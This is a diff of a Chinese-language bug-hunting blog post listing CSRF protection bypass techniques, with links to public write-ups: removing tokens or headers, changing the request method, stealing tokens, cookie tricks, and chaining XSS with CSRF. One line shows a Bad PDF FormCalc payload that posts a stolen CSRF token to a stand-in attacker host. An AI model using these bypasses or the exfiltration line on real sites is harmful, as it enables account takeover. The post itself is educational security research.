@@ -22,12 +22,14 @@ date: 2019-1-8 22:02:24.000000000 +08:00
 
 # Bypass
 我尽力寻找了各种案例和bypass思路，文后会有我看过的文章链接
+
 ---
 删！
 这个思路再很多时候都适用，面对`Referer` `XRSF Header` `token`都可以对其进行删除
 这里我们用一个案例来说明
 `http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/`
 写文的日子是`2019-1-8`这个write up是前天的漏洞，删除了`XRSF Header`
+
 ---
 改！
 这个思路我是在medium上看见的
@@ -35,11 +37,13 @@ date: 2019-1-8 22:02:24.000000000 +08:00
 修改了请求方式GET改成了POST 同样的漏洞挖也挖到过一次，我先修改了请求方式，并把POST的参数通过GET传入，但是也成功完成了CSRF攻击
 如果你观察的仔细的话你可以看出
 `http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/`这个案例删除了`XRSF Header`但是没有成功还是需要修改POST为GET
+
 ---
 盗token！
 尝试从其他渠道获得CSRF token
 `http://www.anquan.us/static/bugs/wooyun-2015-090935.html`
 利用了Referer泄露获取CSRF token 再利用CSRF token进行CSRF攻击
+
 ---
 Use Bad PDF 
 `get() and post() methods of FormCalc allow to ex-filtrate CSRF-token`
@@ -59,11 +63,13 @@ var content = GET("https://example.com/Settings.action"); Post("http://attacker.
 改Cookie！
 有些时候我们会遇到哪种可以修改cookie的漏洞
 比如`CLRF`等，我们可以利用这些漏洞打组合拳进行CSRF攻击
+
 ---
 组合拳！
 XSS+CSRF
 可以利用XSS漏洞进行直接的请求饶过Referer限制
 也可以利用XSS盗取CSRF token 从而进行CSRF漏洞利用
+
 ---
 
 # 浓缩
